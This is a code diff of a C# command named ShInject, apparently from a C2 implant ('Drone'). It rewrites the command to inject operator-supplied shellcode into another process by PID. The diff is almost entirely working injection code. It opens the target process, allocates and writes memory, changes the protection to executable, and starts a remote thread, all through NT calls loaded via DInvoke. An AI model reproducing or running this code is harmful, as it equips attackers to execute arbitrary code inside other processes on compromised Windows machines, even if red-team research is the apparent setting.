@@ -1,41 +1,85 @@
 ﻿using System;
 using System.Threading;
-using System.Threading.Tasks;
 
-using Drone.Models;
-using Drone.Utilities;
+using DInvoke.Data;
 
 namespace Drone.Commands;
 
-public sealed class ShInject : DroneCommand
+using static Interop.Methods;
+using static Interop.Data;
+
+public class ShInject : DroneCommand
 {
-    public override byte Command => 0x17;
+    public override byte Command => 0x4A;
+    public override bool Threaded => false;
     
-    public override async Task Execute(DroneTask task, CancellationToken cancellationToken)
+    public override void Execute(DroneTask task, CancellationToken cancellationToken)
     {
-        var pid = int.Parse(task.Arguments[0]);
+        // parse target pid
+        var pid = uint.Parse(task.Arguments[0]);
+        
+        // open handle to target process
+        var hProcess = IntPtr.Zero;
+        var status = NtOpenProcess(pid, (uint)(PROCESS_ACCESS_FLAGS.PROCESS_VM_READ
+                                               | PROCESS_ACCESS_FLAGS.PROCESS_VM_WRITE |
+                                               PROCESS_ACCESS_FLAGS.PROCESS_VM_OPERATION |
+                                               PROCESS_ACCESS_FLAGS.PROCESS_CREATE_THREAD |
+                                               PROCESS_ACCESS_FLAGS.PROCESS_TERMINATE),
+            ref hProcess);
 
-        var hProcess = Native.NtOpenProcess((uint) pid,
-            (uint) (Win32.PROCESS_ACCESS_FLAGS.PROCESS_VM_WRITE | Win32.PROCESS_ACCESS_FLAGS.PROCESS_VM_OPERATION |
-                    Win32.PROCESS_ACCESS_FLAGS.PROCESS_CREATE_THREAD));
-
-        if (hProcess == IntPtr.Zero)
+        if (status != Native.NTSTATUS.Success)
         {
-            await Drone.SendError(task, "Failed to get handle to process.");
+            Drone.SendTaskError(task.Id, status.ToString());
             return;
         }
 
-        var injector = new Injector(task.Artefact);
+        // allocate memory in process
+        var baseAddress = IntPtr.Zero;
+        status = NtAllocateVirtualMemory(hProcess, task.Artefact.Length, MEMORY_PROTECTION.PAGE_READWRITE, ref baseAddress);
 
-        if (injector.Inject(hProcess))
+        if (status != Native.NTSTATUS.Success)
         {
-            await Drone.SendTaskComplete(task);
+            Drone.SendTaskError(task.Id, status.ToString());
+            CloseHandle(hProcess);
+            return;
         }
-        else
+
+        // write shellcode into process
+        status = NtWriteVirtualMemory(hProcess, baseAddress, task.Artefact);
+        
+        if (status != Native.NTSTATUS.Success)
         {
-            await Drone.SendError(task, "Failed.");
+            Drone.SendTaskError(task.Id, status.ToString());
+            CloseHandle(hProcess);
+            return;
+        }
+
+        // flip memory protection
+        status = NtProtectVirtualMemory(hProcess, baseAddress, task.Artefact.Length,
+            MEMORY_PROTECTION.PAGE_EXECUTE_READ, out _);
+        
+        if (status != Native.NTSTATUS.Success)
+        {
+            Drone.SendTaskError(task.Id, status.ToString());
+            CloseHandle(hProcess);
+            return;
+        }
+
+        // create thread
+        var hThread = IntPtr.Zero;
+        status = NtCreateThreadEx(hProcess, baseAddress, ref hThread);
+
+        if (status != Native.NTSTATUS.Success)
+        {
+            Drone.SendTaskError(task.Id, status.ToString());
+            CloseHandle(hProcess);
+            return;
         }
         
-        Win32.CloseHandle(hProcess);
+        // close handle
+        CloseHandle(hProcess);
+        CloseHandle(hThread);
+        
+        Drone.SendTaskComplete(task.Id);
     }
 }
